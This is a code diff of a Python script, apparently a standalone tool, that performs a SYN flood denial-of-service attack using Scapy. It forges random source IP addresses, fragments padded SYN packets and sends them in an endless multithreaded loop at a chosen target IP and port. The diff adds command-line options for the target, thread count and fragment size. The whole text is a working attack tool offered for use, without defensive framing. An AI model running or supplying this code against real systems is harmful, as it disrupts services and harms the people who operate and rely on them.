@@ -11,19 +11,21 @@
 import random
 import sys
 import threading
+import click
 from scapy.all import *
 from faker import Faker
 
 
-target = None
-port = None
-thread_limit = 2000
-total = 0
+targetIp = None
+targetPort = None
+threadLimit = 200
+fragSize = 500
 payload="A"*2000
 fake = Faker()
 
+
 class sendSYN(threading.Thread):
-	global target, port, payload
+	global targetIp, targetPort, payload
 	def __init__(self):
 		threading.Thread.__init__(self)
 
@@ -31,12 +33,12 @@ class sendSYN(threading.Thread):
 		#Layer 3 forging
 		ip = IP()
 		ip.src = fake.ipv4_public(network=False, address_class=None)
-		ip.dst = target
+		ip.dst = targetIp
 
 		#Layer 4 forging
 		tcp = TCP()
 		tcp.sport = random.randint(1025,65535)
-		tcp.dport = port
+		tcp.dport = targetPort
 		#Here comes the SYN flood mechanic part, yes, that easy
 		#Only make sure you don't respond with another script!
 		tcp.flags = 'S'
@@ -44,25 +46,30 @@ class sendSYN(threading.Thread):
 		#The actual packet
 		packet=ip/tcp/payload
 		#And finally the fagmentation and sending the fragments part
-		frags=fragment(packet,fragsize=500)
+		frags=fragment(packet,fragsize=fragSize)
 		for fragments in frags:
 			send(fragments,verbose=0)
 
 
 if __name__ == "__main__":
-	if len(sys.argv) != 3:
-		print "Usage: %s <Target IP> <Port>" % sys.argv[0]
-		exit()
 
-	target = sys.argv[1]
-	port = int(sys.argv[2])
+	@click.command()
+	@click.option('--ip', '-i', prompt=True, help='IP address of the target machine')
+	@click.option('--port', '-p', type=(int),prompt=True, help='Port of the service to attack with SYN Flood')
+	@click.option('--threads', '-t', type=(int), prompt=True,help='Number of concurrent threads')
+	@click.option('--size', '-s', type=(int), prompt=True,help='Fragment size')
+	def start(ip,port,threads,size):
+		global targetIp,targetPort, threadLimit, fragSize
+		targetIp = ip
+		targetPort = port
+		threadLimit = threads
+		fragSize = size
+		total = 0
+		print "Flooding %s:%s with SYN fragmented packets" % (ip,port)
+		while True:
+			if threading.activeCount() < threadLimit:
+				sendSYN().start()
+				total+=1
+				sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
 
-
-	print "Flooding %s:%i with SYN fragmented packets" % (target,port)
-	while True:
-		if threading.activeCount() < thread_limit:
-			sendSYN().start()
-			total+=1
-			sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
-
-
+	start()
